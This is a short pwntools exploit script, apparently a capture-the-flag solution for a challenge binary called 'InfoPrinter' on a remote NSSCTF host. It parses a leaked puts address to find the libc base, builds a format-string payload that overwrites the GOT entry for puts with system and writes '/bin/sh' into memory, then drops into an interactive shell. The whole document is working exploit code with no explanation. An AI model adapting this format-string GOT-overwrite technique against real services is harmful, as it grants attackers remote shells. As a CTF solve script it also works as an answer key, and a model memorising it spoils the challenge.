from pwn import *

context.arch = 'amd64'

io = remote("node5.anna.nssctf.cn", 29700)
libc = ELF("./libc-2.31.so")
elf = ELF("./InfoPrinter")

io.recvuntil(b"Here is a key 0x")
puts_addr = int(io.recv(12), 16)
xx_addr = 0x403878

libc_base = puts_addr - libc.sym["puts"]
print("libc base addr = ", hex(libc_base))
system_addr = libc_base + libc.sym["system"]
# offset = 6
payload=fmtstr_payload(6,{elf.got["puts"]:system_addr,xx_addr:b'/bin/sh\x00'})

io.sendline(payload)
io.interactive()
